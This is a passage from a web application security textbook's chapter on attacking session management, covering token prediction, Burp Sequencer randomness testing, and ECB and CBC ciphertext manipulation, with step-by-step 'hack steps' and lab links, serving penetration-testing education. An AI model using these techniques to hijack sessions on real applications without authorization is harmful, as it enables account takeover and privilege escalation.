data may be padding. Only a small part of it may actually be relevant to the 
validation that the server performs on the token. Narrowing down the subparts of a token that are actually required can often considerably reduce the 
amount of apparent entropy and complexity that the token contains.
c07.indd 211 c07.indd 211 8/19/2011 12:07:39 PM 8/19/2011 12:07:39 PM
Stuttard c07.indd V3 - 07/22/2011 Page 212
212 Chapter 7 n Attacking Session Management
HACK STEPS
 1. Obtain a single token from the application, and modify it in systematic 
ways to determine whether the entire token is validated or whether some 
of its subcomponents are ignored. Try changing the token‚Äôs value one 
byte at a time (or even one bit at a time) and resubmitting the modified 
token to the application to determine whether it is still accepted. If you 
find that certain portions of the token are not actually required to be correct, you can exclude these from any further analysis, potentially reducing 
the amount of work you need to perform. You can use the ‚Äúchar frobber‚Äù 
payload type in Burp Intruder to modify a token‚Äôs value in one character 
position at a time, to help with this task.
 2. Log in as several different users at different times, and record the tokens 
received from the server. If self-registration is available and you can choose 
your username, log in with a series of similar usernames containing small 
variations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, 
and so on. If other user-specific data is submitted at login or stored in user 
profiles (such as an e-mail address), perform a similar exercise to vary that 
data systematically, and record the tokens received following login.
 3. Analyze the tokens for any correlations that appear to be related to the 
username and other user-controllable data.
 4. Analyze the tokens for any detectable encoding or obfuscation. Where the 
username contains a sequence of the same character, look for a corresponding character sequence in the token, which may indicate the use of XOR 
obfuscation. Look for sequences in the token containing only hexadecimal 
characters, which may indicate a hex encoding of an ASCII string or other 
information. Look for sequences that end in an equals sign and/or that contain only the other valid Base64 characters: a to z, A to Z, 0 to 9, +, and /. 
 5. If any meaning can be reverse-engineered from the sample of session 
tokens, consider whether you have sufficient information to attempt to 
guess the tokens recently issued to other application users. Find a page 
of the application that is session-dependent, such as one that returns an 
error message or a redirect elsewhere if accessed without a valid session. 
Then use a tool such as Burp Intruder to make large numbers of requests 
to this page using guessed tokens. Monitor the results for any cases in 
which the page is loaded correctly, indicating a valid session token.
TRY IT!
http://mdsec.net/auth/321/
http://mdsec.net/auth/329/
http://mdsec.net/auth/331/
c07.indd 212 c07.indd 212 8/19/2011 12:07:39 PM 8/19/2011 12:07:39 PM
Stuttard c07.indd V3 - 07/22/2011 Page 213
 Chapter 7 n Attacking Session Management 213
Predictable Tokens
Some session tokens do not contain any meaningful data associating them 
with a particular user. Nevertheless, they can be guessed because they contain 
sequences or patterns that allow an attacker to extrapolate from a sample of 
tokens to fi nd other valid tokens recently issued by the application. Even if the 
extrapolation involves some trial and error (for example, one valid guess per 
1,000 attempts), this would still enable an automated attack to identify large 
numbers of valid tokens in a relatively short period of time.
Vulnerabilities relating to predictable token generation may be much easier to 
discover in commercial implementations of session management, such as web 
servers or web application platforms, than they are in bespoke applications. 
When you are remotely targeting a bespoke session management mechanism, 
your sample of issued tokens may be restricted by the server‚Äôs capacity, the 
activity of other users, your bandwidth, network latency, and so on. In a laboratory environment, however, you can quickly create millions of sample tokens, 
all precisely sequenced and time-stamped, and you can eliminate interference 
caused by other users.
In the simplest and most brazenly vulnerable cases, an application may use 
a simple sequential number as the session token. In this case, you only need 
to obtain a sample of two or three tokens before launching an attack that will 
quickly capture 100% of currently valid sessions.
Figure 7-1 shows Burp Intruder being used to cycle the last two digits of a 
sequential session token to fi nd values where the session is still active and can 
be hijacked. Here, the length of the server‚Äôs response is a reliable indicator that 
a valid session has been found. The extract grep feature has also been used to 
show the name of the logged-in user for each session.
In other cases, an application‚Äôs tokens may contain more elaborate sequences 
that take some effort to discover. The types of potential variations you might 
encounter here are open-ended, but the authors‚Äô experience in the fi eld indicates 
that predictable session tokens commonly arise from three different sources:
n Concealed sequences
n Time dependency
n Weak random number generation
We will look at each of these areas in turn.
Concealed Sequences
It is common to encounter session tokens that cannot be easily predicted when 
analyzed in their raw form but that contain sequences that reveal themselves 
when the tokens are suitably decoded or unpacked.
c07.indd 213 c07.indd 213 8/19/2011 12:07:39 PM 8/19/2011 12:07:39 PM
Stuttard c07.indd V3 - 07/22/2011 Page 214
214 Chapter 7 n Attacking Session Management
Figure 7-1: An attack to discover valid sessions where the session token is 
predictable
Consider the following series of values, which form one component of a 
structured session token:
lwjVJA
Ls3Ajg
xpKr+A
XleXYg
9hyCzA
jeFuNg
JaZZoA
No immediate pattern is discernible; however, a cursory inspection indicates 
that the tokens may contain Base64-encoded data. In addition to the mixed-case 
alphabetic and numeric characters, there is a + character, which is also valid in 
a Base64-encoded string. Running the tokens through a Base64 decoder reveals 
the following:
--√ï$
.√ç√Ä≈Ω
√Ü‚Äô¬´√∏
^W-b
√∂‚Äö√å
?√°n6
%¬¶Y
c07.indd 214 c07.indd 214 8/19/2011 12:07:39 PM 8/19/2011 12:07:39 PM
Stuttard c07.indd V3 - 07/22/2011 Page 215
 Chapter 7 n Attacking Session Management 215
These strings appear to be gibberish and also contain nonprinting characters. This 
normally indicates that you are dealing with binary data rather than ASCII text. 
Rendering the decoded data as hexadecimal numbers gives you the following:
9708D524
2ECDC08E
C692ABF8
5E579762
F61C82CC
8DE16E36
25A659A0
There is still no visible pattern. However, if you subtract each number from the 
previous one, you arrive at the following:
FF97C4EB6A
97C4EB6A
FF97C4EB6A
97C4EB6A
FF97C4EB6A
FF97C4EB6A
which immediately reveals the concealed pattern. The algorithm used to generate 
tokens adds 0x97C4EB6A to the previous value, truncates the result to a 32-bit 
number, and Base64-encodes this binary data to allow it to be transported using 
the text-based protocol HTTP. Using this knowledge, you can easily write a 
script to produce the series of tokens that the server will next produce, and the 
series that it produced prior to the captured sample.
Time Dependency
Some web servers and applications employ algorithms to generate session tokens 
that use the time of generation as an input to the token‚Äôs value. If insuffi cient 
other entropy is incorporated into the algorithm, you may be able to predict 
other users‚Äô tokens. Although any given sequence of tokens on its own may 
appear to be random, the same sequence coupled with information about the 
time at which each token was generated may contain a discernible pattern. In a 
busy application with a large number of sessions being created each second, a 
scripted attack may succeed in identifying large numbers of other users‚Äô tokens.
When testing the web application of an online retailer, the authors encountered the following sequence of session tokens:
3124538-1172764258718
3124539-1172764259062
3124540-1172764259281
3124541-1172764259734
3124542-1172764260046
3124543-1172764260156
c07.indd 215 c07.indd 215 8/19/2011 12:07:39 PM 8/19/2011 12:07:39 PM
Stuttard c07.indd V3 - 07/22/2011 Page 216
216 Chapter 7 n Attacking Session Management
3124544-1172764260296
3124545-1172764260421
3124546-1172764260812
3124547-1172764260890
Each token is clearly composed of two separate numeric components. The 
fi rst number follows a simple incrementing sequence and is easy to predict. 
The second number increases by a varying amount each time. Calculating the 
 differences between its value in each successive token reveals the following:
344
219
453
312
110
140
125
391
78
The sequence does not appear to contain a reliably predictable pattern. However, 
it would clearly be possible to brute-force the relevant number range in an automated attack to discover valid values in the sequence. Before attempting this 
attack, however, we wait a few minutes and gather a further sequence of tokens:
3124553-1172764800468
3124554-1172764800609
3124555-1172764801109
3124556-1172764801406
3124557-1172764801703
3124558-1172764802125
3124559-1172764802500
3124560-1172764802656
3124561-1172764803125
3124562-1172764803562
Comparing this second sequence of tokens with the fi rst, two points are immediately obvious:
n The fi rst numeric sequence continues to progress incrementally; however, 
fi ve values have been skipped since the end of the fi rst sequence. This is 
presumably because the missing values have been issued to other users 
who logged in to the application in the window between the two tests.
n The second numeric sequence continues to progress by similar intervals 
as before; however, the fi rst value we obtain is a massive 539,578 greater 
than the previous value.
c07.indd 216 c07.indd 216 8/19/2011 12:07:39 PM 8/19/2011 12:07:39 PM
Stuttard c07.indd V3 - 07/22/2011 Page 217
 Chapter 7 n Attacking Session Management 217
This second observation immediately alerts us to the role played by time 
in generating session tokens. Apparently, only fi ve tokens have been issued 
between the two token-grabbing exercises. However, a period of approximately 
10 minutes has elapsed. The most likely explanation is that the second number 
is time-dependent and is probably a simple count of milliseconds.
Indeed, our hunch is correct. In a subsequent phase of our testing we perform 
a code review, which reveals the following token-generation algorithm:
String sessId = Integer.toString(s_SessionIndex++) +
 ‚Äú-‚Äù +
 System.currentTimeMillis();
Given our analysis of how tokens are created, it is straightforward to construct a scripted attack to harvest the session tokens that the application issues 
to other users:
n We continue polling the server to obtain new session tokens in quick 
succession.
n We monitor the increments in the fi rst number. When this increases by 
more than 1, we know that a token has been issued to another user.
n When a token has been issued to another user, we know the upper and 
lower bounds of the second number that was issued to that person, because 
we possess the tokens that were issued immediately before and after 
his. Because we are obtaining new session tokens frequently, the range 
between these bounds will typically consist of only a few hundred values.
n Each time a token is issued to another user, we launch a brute-force attack 
to iterate through each number in the range, appending this to the missing incremental number that we know was issued to the other user. We 
attempt to access a protected page using each token we construct, until 
the attempt succeeds and we have compromised the user‚Äôs session.
n Running this scripted attack continuously will enable us to capture the 
session token of every other application user. When an administrative 
user logs in, we will fully compromise the entire application.
TRY IT!
http://mdsec.net/auth/339/
http://mdsec.net/auth/340/
http://mdsec.net/auth/347/
http://mdsec.net/auth/351/
c07.indd 217 c07.indd 217 8/19/2011 12:07:40 PM 8/19/2011 12:07:40 PM
Stuttard c07.indd V3 - 07/22/2011 Page 218
218 Chapter 7 n Attacking Session Management
Weak Random Number Generation
Very little that occurs inside a computer is random. Therefore, when randomness is required for some purpose, software uses various techniques to generate 
numbers in a pseudorandom manner. Some of the algorithms used produce 
sequences that appear to be stochastic and manifest an even spread across the 
range of possible values. Nevertheless, they can be extrapolated forwards or 
backwards with perfect accuracy by anyone who obtains a small sample of values.
When a predictable pseudorandom number generator is used to produce 
session tokens, the resulting tokens are vulnerable to sequencing by an attacker.
Jetty is a popular web server written in 100% Java that provides a session 
management mechanism for use by applications running on it. In 2006, Chris 
Anley of NGSSoftware discovered that the mechanism was vulnerable to a 
 session token prediction attack. The server used the Java API java.util.Random
to generate session tokens. This implements a ‚Äúlinear congruential generator,‚Äù 
which generates the next number in the sequence as follows:
synchronized protected int next(int bits) {
 seed = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
 return (int)(seed >>> (48 - bits));
}
This algorithm takes the last number generated, multiplies it by a constant, 
and adds another constant to obtain the next number. The number is truncated 
to 48 bits, and the algorithm shifts the result to return the specifi c number of 
bits requested by the caller.
Knowing this algorithm and a single number generated by it, we can easily 
derive the sequence of numbers that the algorithm will generate next. With a 
little number theory, we also can derive the sequence that it generated previously. This means that an attacker who obtains a single session token from the 
server can obtain the tokens of all current and future sessions.
NOTE Sometimes when tokens are created based on the output of a pseudorandom number generator, developers decide to construct each token by 
concatenating several sequential outputs from the generator. The perceived 
rationale for this is that it creates a longer, and therefore ‚Äústronger,‚Äù token. 
However, this tactic is usually a mistake. If an attacker can obtain several 
consecutive outputs from the generator, this may enable him to infer some 
information about its internal state. In fact, it may be easier for the attacker to 
extrapolate the generator‚Äôs sequence of outputs, either forward or backward.
Other off-the-shelf application frameworks use surprisingly simple or predictable sources of entropy in session token generation, much of which is deterministic. 
For example, in PHP frameworks 5.3.2 and earlier, the session token is generated 
c07.indd 218 c07.indd 218 8/19/2011 12:07:40 PM 8/19/2011 12:07:40 PM
Stuttard c07.indd V3 - 07/22/2011 Page 219
 Chapter 7 n Attacking Session Management 219
based on the client‚Äôs IP address, epoch time at token creation, microseconds at 
token creation, and a linear congruential generator. Although there are several 
unknown values here, some applications may disclose information that allows 
them to be inferred. A social networking site may disclose the login time and 
IP address of site users. Additionally, the seed used in this generator is the time 
when the PHP process started, which could be determined to lie within a small 
range of values if the attacker is monitoring the server.
NOTE This is an evolving area of research. The weaknesses in PHP‚Äôs session 
token generation were pointed out on the Full Disclosure mailing list in 2001 
but were not demonstrated to be actually exploitable. The 2001 theory was 
fi nally put into practice by Samy Kamkar with the phpwn tool in 2010.
Testing the Quality of Randomness
In some cases, you can identify patterns in a series of tokens just from visual 
inspection, or from a modest amount of manual analysis. In general, however, 
you need to use a more rigorous approach to testing the quality of randomness 
within an application‚Äôs tokens.
The standard approach to this task applies the principles of statistical hypothesis testing and employs various well-documented tests that look for evidence of 
nonrandomness within a sample of tokens. The high-level steps in this process 
are as follows:
 1. Start with the hypothesis that the tokens are randomly generated.
 2. Apply a series of tests, each of which observes specifi c properties of the 
sample that are likely to have certain characteristics if the tokens are 
 randomly generated.
 3. For each test, calculate the probability of the observed characteristics 
occurring, working on the assumption that the hypothesis is true.
 4. If this probability falls below a certain level (the ‚Äúsignifi cance level‚Äù), reject 
the hypothesis and conclude that the tokens are not randomly generated.
The good news is you don‚Äôt have to do any of this manually! The best tool 
that is currently available for testing the randomness of web application tokens 
is Burp Sequencer. This tool applies several standard tests in a fl exible way and 
gives you clear results that are easy to interpret.
To use Burp Sequencer, you need to fi nd a response from the application 
that issues the token you want to test, such as a response to a login request that 
issues a new cookie containing a session token. Select the ‚Äúsend to sequencer‚Äù 
option from Burp‚Äôs context menu, and in the Sequencer confi guration, set the 
location of the token within the response, as shown in Figure 7-2. You can also 
c07.indd 219 c07.indd 219 8/19/2011 12:07:40 PM 8/19/2011 12:07:40 PM
Stuttard c07.indd V3 - 07/22/2011 Page 220
220 Chapter 7 n Attacking Session Management
confi gure various options that affect how tokens are collected, and then click 
the start capture button to begin capturing tokens. If you have already obtained 
a suitable sample of tokens through other means (for example, by saving the 
results of a Burp Intruder attack), you can use the manual load tab to skip the 
capturing of tokens and proceed straight to the statistical analysis.
Figure 7-2: Configuring Burp Sequencer to test the randomness of a session token
When you have obtained a suitable sample of tokens, you can perform the 
statistical analysis on the sample. You can also perform interim analyses while 
the sample is still being captured. In general, obtaining a larger sample improves 
the reliability of the analysis. The minimum sample size that Burp requires is 
100 tokens, but ideally you should obtain a much larger sample than this. If the 
analysis of a few hundred tokens shows conclusively that the tokens fail the 
randomness tests, you may reasonably decide that it is unnecessary to capture 
further tokens. Otherwise, you should continue capturing tokens and re-perform 
the analysis periodically. If you capture 5,000 tokens that are shown to pass the 
randomness tests, you may decide that this is suffi cient. However, to achieve 
compliance with the formal FIPS tests for randomness, you need to obtain a 
sample of 20,000 tokens. This is the largest sample size that Burp supports.
Burp Sequencer performs the statistical tests at character level and bit level. 
The results of all tests are aggregated to give an overall estimate of the number 
c07.indd 220 c07.indd 220 8/19/2011 12:07:40 PM 8/19/2011 12:07:40 PM
Stuttard c07.indd V3 - 07/22/2011 Page 221
 Chapter 7 n Attacking Session Management 221
of bits of effective entropy within the token; this the key result to consider. 
However, you can also drill down into the results of each test to understand 
exactly how and why different parts of the token passed or failed each test, as 
shown in Figure 7-3. The methodology used for each type of test is described 
beneath the test results.
Figure 7-3: Analyzing the Burp Sequencer results to understand the properties of 
the tokens that were tested
Note that Burp performs all tests individually on each character and bit of data 
within the token. In many cases, you will fi nd that large parts of a structured 
token are not random; this in itself may not present any kind of weakness. What 
matters is that the token contains a suffi cient number of bits that do pass the 
randomness tests. For example, if a large token contains 1,000 bits of information, and only 50 of these bits pass the randomness tests, the token as a whole 
is no less robust than a 50-bit token that fully passes the tests.
c07.indd 221 c07.indd 221 8/19/2011 12:07:40 PM 8/19/2011 12:07:40 PM
Stuttard c07.indd V3 - 07/22/2011 Page 222
222 Chapter 7 n Attacking Session Management
NOTE Keep in mind two important caveats when performing statistical tests for randomness. These caveats affect the correct interpretation of 
the test results and their consequences for the application‚Äôs security posture. First, tokens that are generated in a completely deterministic way may 
pass the statistical tests for randomness. For example, a linear congruential 
pseudorandom number generator, or an algorithm that computes the hash 
of a sequential number, may produce output that passes the tests. Yet an 
attacker who knows the algorithm and the internal state of the generator can 
extrapolate its output with complete reliability in both forward and reverse 
directions.
Second, tokens that fail the statistical tests for randomness may not actually be predictable in any practical situation. If a given bit of a token fails the 
tests, this means only that the sequence of bits observed at that position contains characteristics that are unlikely to occur in a genuinely random token. 
But attempting to predict the value of that bit in the next token, based on the 
observed characteristics, may be little more reliable than blind guesswork. 
Multiplying this unreliability across a large number of bits that need to be 
predicted simultaneously may mean that the probability of making a correct 
prediction is extremely low.
HACK STEPS
 1. Determine when and how session tokens are issued by walking through 
the application from the first application page through any login functions. Two behaviors are common:
n The application creates a new session anytime a request is received that 
does not submit a token.
n The application creates a new session following a successful login.
To harvest large numbers of tokens in an automated way, ideally identify 
a single request (typically either GET / or a login submission) that causes 
a new token to be issued.
 2. In Burp Suite, send the request that creates a new session to Burp 
Sequencer, and configure the token‚Äôs location. Then start a live capture 
to gather as many tokens as is feasible. If a custom session management 
mechanism is in use, and you only have remote access to the application, 
gather the tokens as quickly as possible to minimize the loss of tokens 
issued to other users and reduce the influence of any time dependency.
 3. If a commercial session management mechanism is in use and/or you 
have local access to the application, you can obtain indefinitely large 
sequences of session tokens in controlled conditions.
c07.indd 222 c07.indd 222 8/19/2011 12:07:41 PM 8/19/2011 12:07:41 PM
Stuttard c07.indd V3 - 07/22/2011 Page 223
 Chapter 7 n Attacking Session Management 223
 4. While Burp Sequencer is capturing tokens, enable the ‚Äúauto analyse‚Äù setting so that Burp automatically performs the statistical analysis periodically. Collect at least 500 tokens before reviewing the results in any detail. 
If a sufficient number of bits within the token have passed the tests, 
continue gathering tokens for as long as is feasible, reviewing the analysis 
results as further tokens are captured.
 5. If the tokens fail the randomness tests and appear to contain patterns 
that could be exploited to predict future tokens, reperform the exercise 
from a different IP address and (if relevant) a different username. This 
will help you identify whether the same pattern is detected and whether 
tokens received in the first exercise could be extrapolated to identify 
tokens received in the second. Sometimes the sequence of tokens captured by one user manifests a pattern. But this will not allow straightforward extrapolation to the tokens issued to other users, because 
information such as source IP is used as a source of entropy (such as a 
seed to a random number generator).
 6. If you believe you have enough insight into the token generation algorithm to mount an automated attack against other users‚Äô sessions, it is 
likely that the best means of achieving this is via a customized script. 
This can generate tokens using the specific patterns you have observed 
and apply any necessary encoding. See Chapter 14 for some generic techniques for applying automation to this type of problem.
 7. If source code is available, closely review the code responsible for generating session tokens to understand the mechanism used and determine 
whether it is vulnerable to prediction. If entropy is drawn from data that 
can be determined within the application within a brute-forcible range, 
consider the practical number of requests that would be needed to bruteforce an application token.
TRY IT!
http://mdsec.net/auth/361/
Encrypted Tokens
Some applications use tokens that contain meaningful information about the 
user and seek to avoid the obvious problems that this entails by encrypting the 
tokens before they are issued to users. Since the tokens are encrypted using a 
secret key that is unknown to users, this appears to be a robust approach, because 
users will be unable to decrypt the tokens and tamper with their contents.
c07.indd 223 c07.indd 223 8/19/2011 12:07:41 PM 8/19/2011 12:07:41 PM
Stuttard c07.indd V3 - 07/22/2011 Page 224
224 Chapter 7 n Attacking Session Management
However, in some situations, depending on the encryption algorithm used and 
the manner in which the application processes the tokens, it may nonetheless be 
possible for users to tamper with the tokens‚Äô meaningful contents without actually decrypting them. Bizarre as it may sound, these are actually viable attacks 
that are sometimes easy to deliver, and numerous real-world applications have 
proven vulnerable to them. The kinds of attacks that are applicable depend on 
the exact cryptographic algorithm that is being used.
ECB Ciphers
Applications that employ encrypted tokens use a symmetric encryption algorithm 
so that tokens received from users can be decrypted to recover their meaningful 
contents. Some symmetric encryption algorithms use an ‚Äúelectronic codebook‚Äù 
(ECB) cipher. This type of cipher divides plaintext into equal-sized blocks (such 
as 8 bytes each) and encrypts each block using the secret key. During decryption, each block of ciphertext is decrypted using the same key to recover the 
original block of plaintext. One feature of this method is that patterns within the 
plaintext can result in patterns within the ciphertext, because identical blocks of 
plaintext will be encrypted into identical blocks of ciphertext. For some types 
of data, such as bitmap images, this means that meaningful information from 
the plaintext can be discerned within the ciphertext, as illustrated in Figure 7-4.
Figure 7-4: Patterns within plaintext that 
is encrypted using an ECB cipher may be 
visible within the resulting ciphertext.
In spite of this shortcoming with ECB, these ciphers are often used for encrypting information within web applications. Even in situations where the problem 
of patterns within plaintext does not arise, vulnerabilities can still exist. This 
is because of the cipher‚Äôs behavior of encrypting identical plaintext blocks into 
identical ciphertext blocks. 
Consider an application whose tokens contain several different meaningful 
components, including a numeric user identifi er:
rnd=2458992;app=iTradeEUR_1;uid=218;username=dafydd;time=634430423694715
000;
c07.indd 224 c07.indd 224 8/19/2011 12:07:41 PM 8/19/2011 12:07:41 PM
Stuttard c07.indd V3 - 07/22/2011 Page 225
 Chapter 7 n Attacking Session Management 225
When this token is encrypted, it is apparently meaningless and is likely to pass 
all standard statistical tests for randomness:
68BAC980742B9EF80A27CBBBC0618E3876FF3D6C6E6A7B9CB8FCA486F9E11922776F0307
329140AABD223F003A8309DDB6B970C47BA2E249A0670592D74BCD07D51A3E150EFC2E69
885A5C8131E4210F
The ECB cipher being employed operates on 8-byte blocks of data, and the 
blocks of plaintext map to the corresponding blocks of ciphertext as follows:
rnd=2458 68BAC980742B9EF8
992;app= 0A27CBBBC0618E38
iTradeEU 76FF3D6C6E6A7B9C
R_1;uid= B8FCA486F9E11922
218;user 776F0307329140AA
name=daf BD223F003A8309DD
ydd;time B6B970C47BA2E249
=6344304 A0670592D74BCD07
23694715 D51A3E150EFC2E69
000; 885A5C8131E4210F
Now, because each block of ciphertext will always decrypt into the same 
block of plaintext, it is possible for an attacker to manipulate the sequence of 
ciphertext blocks so as to modify the corresponding plaintext in meaningful ways. Depending on how exactly the application processes the resulting 
decrypted token, this may enable the attacker to switch to a different user or 
escalate privileges.
For example, if the second block is duplicated following the fourth block, the 
sequence of blocks will be as follows:
rnd=2458 68BAC980742B9EF8
992;app= 0A27CBBBC0618E38
iTradeEU 76FF3D6C6E6A7B9C
R_1;uid= B8FCA486F9E11922
992;app= 0A27CBBBC0618E38
218;user 776F0307329140AA
name=daf BD223F003A8309DD
ydd;time B6B970C47BA2E249
=6344304 A0670592D74BCD07
23694715 D51A3E150EFC2E69
000; 885A5C8131E4210F
The decrypted token now contains a modifi ed uid value, and also a duplicated 
app value. Exactly what happens depends on how the application processes 
the decrypted token. Often, applications using tokens in this way inspect only 
certain parts of the decrypted token, such as the user identifi er. If the application behaves like this, then it will process the request in the context of the user 
who has a uid of 992, rather than the original 218.
c07.indd 225 c07.indd 225 8/19/2011 12:07:41 PM 8/19/2011 12:07:41 PM
Stuttard c07.indd V3 - 07/22/2011 Page 226
226 Chapter 7 n Attacking Session Management
The attack just described would depend on being issued with a suitable rnd
value that corresponds to a valid uid value when the blocks are manipulated. 
An alternative and more reliable attack would be to register a username containing a numeric value at the appropriate offset, and duplicate this block so as 
to replace the existing uid value. Suppose you register the username daf1, and 
are issued with the following token:
9A5A47BF9B3B6603708F9DEAD67C7F4C76FF3D6C6E6A7B9CB8FCA486F9E11922A5BC430A
73B38C14BD223F003A8309DDF29A5A6F0DC06C53905B5366F5F4684C0D2BBBB08BD834BB
ADEBC07FFE87819D
The blocks of plaintext and ciphertext for this token are as follows:
rnd=9224 9A5A47BF9B3B6603
856;app= 708F9DEAD67C7F4C
iTradeEU 76FF3D6C6E6A7B9C
R_1;uid= B8FCA486F9E11922
219;user A5BC430A73B38C14
name=daf BD223F003A8309DD
1;time=6 F29A5A6F0DC06C53
34430503 905B5366F5F4684C
61065250 0D2BBBB08BD834BB
0; ADEBC07FFE87819D
If you then duplicate the seventh block following the fourth block, your 
decrypted token will contain a uid value of 1:
rnd=9224 9A5A47BF9B3B6603
856;app= 708F9DEAD67C7F4C
iTradeEU 76FF3D6C6E6A7B9C
R_1;uid= B8FCA486F9E11922
1;time=6 F29A5A6F0DC06C53
219;user A5BC430A73B38C14
name=daf BD223F003A8309DD
1;time=6 F29A5A6F0DC06C53
34430503 905B5366F5F4684C
61065250 0D2BBBB08BD834BB
0; ADEBC07FFE87819D
By registering a suitable range of usernames and reperforming this attack, 
you could potentially cycle through the entire range of valid uid values, and 
so masquerade as every user of the application. 
TRY IT!
http://mdsec.net/auth/363/
c07.indd 226 c07.indd 226 8/19/2011 12:07:41 PM 8/19/2011 12:07:41 PM
Stuttard c07.indd V3 - 07/22/2011 Page 227
 Chapter 7 n Attacking Session Management 227
CBC Ciphers
The shortcomings in ECB ciphers led to the development of cipher block chaining 
(CBC) ciphers. With a CBC cipher, before each block of plaintext is encrypted 
it is XORed against the preceding block of ciphertext, as shown in Figure 7-5. 
This prevents identical plaintext blocks from being encrypted into identical 
ciphertext blocks. During decryption, the XOR operation is applied in reverse, 
and each decrypted block is XORed against the preceding block of ciphertext 
to recover the original plaintext.
Figure 7-5: In a CBC cipher, each block of plaintext is XORed against the preceding 
block of ciphertext before being encrypted.
Block Cipher
Encryption
Block Cipher
Encryption
Block Cipher
Encryption
Ciphertext Ciphertext Ciphertext
Key
Initialization Vector (IV)
Plaintext Plaintext Plaintext
Key Key
Because CBC ciphers avoid some of the problems with ECB ciphers, standard 
symmetric encryption algorithms such as DES and AES frequently are used 
in CBC mode. However, the way in which CBC-encrypted tokens are often 
employed in web applications means that an attacker may be able to manipulate 
parts of the decrypted tokens without knowing the secret key.
Consider a variation on the preceding application whose tokens contain 
several different meaningful components, including a numeric user identifi er:
rnd=191432758301;app=eBankProdTC;uid=216;time=6343303;
As before, when this information is encrypted, it results in an apparently meaningless token:
0FB1F1AFB4C874E695AAFC9AA4C2269D3E8E66BBA9B2829B173F255D447C51321586257C
6E459A93635636F45D7B1A43163201477
Because this token is encrypted using a CBC cipher, when the token is decrypted, 
each block of ciphertext is XORed against the following block of decrypted text 
to obtain the plaintext. Now, if an attacker modifi es parts of the ciphertext (the 
token he received), this causes that specifi c block to decrypt into junk. However, it 
also causes the following block of decrypted text to be XORed against a different 
c07.indd 227 c07.indd 227 8/19/2011 12:07:41 PM 8/19/2011 12:07:41 PM
Stuttard c07.indd V3 - 07/22/2011 Page 228
228 Chapter 7 n Attacking Session Management
value, resulting in modifi ed but still meaningful plaintext. In other words, by 
manipulating a single individual block of the token, the attacker can systematically modify the decrypted contents of the block that follows it. Depending on 
how the application processes the resulting decrypted token, this may enable 
the attacker to switch to a different user or escalate privileges.
Let‚Äôs see how. In the example described, the attacker works through the 
encrypted token, changing one character at a time in arbitrary ways and sending each modifi ed token to the application. This involves a large number of 
requests. The following is a selection of the values that result when the application decrypts each modifi ed token:
????????32858301;app=eBankProdTC;uid=216;time=6343303;
????????32758321;app=eBankProdTC;uid=216;time=6343303;
rnd=1914????????;aqp=eBankProdTC;uid=216;time=6343303;
rnd=1914????????;app=eAankProdTC;uid=216;time=6343303;
rnd=191432758301????????nkPqodTC;uid=216;time=6343303;
rnd=191432758301????????nkProdUC;uid=216;time=6343303;
rnd=191432758301;app=eBa????????;uie=216;time=6343303;
rnd=191432758301;app=eBa????????;uid=226;time=6343303;
rnd=191432758301;app=eBankProdTC????????;timd=6343303;
rnd=191432758301;app=eBankProdTC????????;time=6343503;
In each case, the block that the attacker has modifi ed decrypts into junk, as 
expected (indicated by ????????). However, the following block decrypts into 
meaningful text that differs slightly from the original token. As already described, 
this difference occurs because the decrypted text is XORed against the preceding block of ciphertext, which the attacker has slightly modifi ed.
Although the attacker does not see the decrypted values, the application 
attempts to process them, and the attacker sees the results in the application‚Äôs 
responses. Exactly what happens depends on how the application handles the 
part of the decrypted token that has been corrupted. If the application rejects 
tokens containing any invalid data, the attack fails. Often, however, applications using tokens in this way inspect only certain parts of the decrypted 
token, such as the user identifi er. If the application behaves like this, then 
the eighth example shown in the preceding list succeeds, and the application 
processes the request in the context of the user who has a uid of 226, rather 
than the original 216.
You can easily test applications for this vulnerability using the ‚Äúbit fl ipper‚Äù payload type in Burp Intruder. First, you need to log in to the application using your own account. Then you fi nd a page of the application that 
depends on a logged-in session and shows the identity of the logged-in user 
within the response. Typically, the user‚Äôs home landing page or account details 
page serves this purpose. Figure 7-6 shows Burp Intruder set up to target the 
user‚Äôs home page, with the encrypted session token marked as a payload 
position.
c07.indd 228 c07.indd 228 8/19/2011 12:07:41 PM 8/19/2011 12:07:41 PM
Stuttard c07.indd V3 - 07/22/2011 Page 229
 Chapter 7 n Attacking Session Management 229
Figure 7-6: Configuring Burp Intruder to modify an encrypted session token
Figure 7-7 shows the required payload confi guration. It tells Burp to operate on the token‚Äôs original value, treating it as ASCII-encoded hex, and to fl ip 
each bit at each character position. This approach is ideal because it requires a 
relatively small number of requests (eight requests per byte of data in the token) 
and almost always identifi es whether the application is vulnerable. This allows 
you to use a more focused attack to perform actual exploitation.
When the attack is executed, the initial requests do not cause any noticeable 
change in the application‚Äôs responses, and the user‚Äôs session is still intact. This 
is interesting in itself, because it indicates that the fi rst part of the token is not 
being used to identify the logged-in user. Many of the requests later in the attack 
cause a redirection to the login page, indicating that modifi cation has invalidated the token in some way. Crucially, there is also a run of requests where 
the response appears to be part of a valid session but is not associated with the 
original user identity. This corresponds to the block of the token that contains 
the uid value. In some cases, the application simply displays ‚Äúunknown user,‚Äù 
indicating that the modifi ed uid did not correspond to an actual user, and so the 
attack failed. In other cases, it shows the name of a different registered user of 
the application, proving conclusively that the attack has succeeded. Figure 7-8 
shows the results of the attack. Here we have defi ned an extract grep column 
to display the identity of the logged-in user and have set a fi lter to hide the 
responses that are redirections to the login page.
c07.indd 229 c07.indd 229 8/19/2011 12:07:41 PM 8/19/2011 12:07:41 PM
Stuttard c07.indd V3 - 07/22/2011 Page 230
230 Chapter 7 n Attacking Session Management
Figure 7-7: Configuring Burp Intruder to flip each bit in the encrypted token
Figure 7-8: A successful bit flipping attack against an encrypted token
c07.indd 230 c07.indd 230 8/19/2011 12:07:42 PM 8/19/2011 12:07:42 PM
Stuttard c07.indd V3 - 07/22/2011 Page 231
 Chapter 7 n Attacking Session Management 231
Having identifi ed the vulnerability, you can proceed to exploit it with a more 
focused attack. To do this, you would determine from the results exactly which 
block of the encrypted token is being tampered with when the user context 
changes. Then you would deliver an attack that tests numerous further values within this block. You could use the numbers payload type within Burp 
Intruder to do this.
TRY IT!
http://mdsec.net/auth/365/
NOTE Some applications use the technique of encrypting meaningful data 
within request parameters more generally in an attempt to prevent tampering 
of data, such as the prices of shopping items. In any location where you see 
apparently encrypted data that plays a key role in application functionality, you 
should try the bit-fl ipping technique to see whether you can manipulate the 
encrypted information in a meaningful way to interfere with application logic.
In seeking to exploit the vulnerability described in this section, your objective would of course be to masquerade as different application users ‚Äî ideally 
